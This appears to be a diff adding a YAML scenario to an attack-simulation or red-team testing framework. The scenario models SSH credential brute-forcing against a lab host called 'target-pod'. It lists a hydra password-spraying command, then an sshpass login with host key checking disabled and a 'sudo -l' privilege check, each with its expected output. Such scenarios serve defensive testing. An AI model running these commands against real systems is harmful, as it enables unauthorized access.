@@ -1,0 +1,16 @@
+id: scn-cred-05
+name: Valid Accounts Credential Access
+description: Brute force / credential spraying attempting default administrative logins.
+mitre_tactic: TA0005
+mitre_technique: T1078
+steps:
+  - step: 1
+    action: "hydra -l admin -P /usr/share/wordlists/passwords.txt ssh://target-pod:22"
+    tool: "hydra"
+    delay_ms: 1000
+    expected_output: "[22][ssh] host: target-pod login: admin password: password123 [SUCCESS]"
+  - step: 2
+    action: "sshpass -p 'password123' ssh -o StrictHostKeyChecking=no admin@target-pod 'sudo -l'"
+    tool: "ssh"
+    delay_ms: 600
+    expected_output: "User admin may run the following commands on target-pod: (ALL) NOPASSWD: ALL"
